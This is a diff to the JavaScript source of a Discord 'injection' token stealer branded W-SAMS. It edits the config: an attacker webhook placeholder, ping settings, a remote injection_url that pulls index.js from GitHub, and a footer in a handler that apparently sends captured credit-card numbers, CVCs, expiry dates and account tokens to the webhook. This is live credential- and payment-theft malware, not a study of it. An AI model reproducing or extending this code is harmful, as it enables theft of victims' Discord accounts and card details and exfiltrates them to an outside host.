@@ -8,16 +8,13 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: false, 
-  ping_on_run: true, 
-  ping_val: '@everyone',
-  embed_name: 'W-SAMS Stealer', 
-  embed_icon: 'https://raw.githubusercontent.com/latews1/injection/main/26.png'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/latews1/injection/main/index.js', 
-  /**
-   
-   **/
+  auto_buy_nitro: false,
+  ping_on_run: false,
+  ping_val: '@here',
+  embed_name: 'W-SAMS',
+  embed_icon: 'https://raw.githubusercontent.com/latews1/injection/refs/heads/main/26.png', 
+  embed_color: 00000000, 
+  injection_url: 'https://raw.githubusercontent.com/latews1/injection/refs/heads/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -848,7 +845,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By W-SAMS',
+          text: '🎉・Discord Injection W-SAMS',
         },
       },
     ],
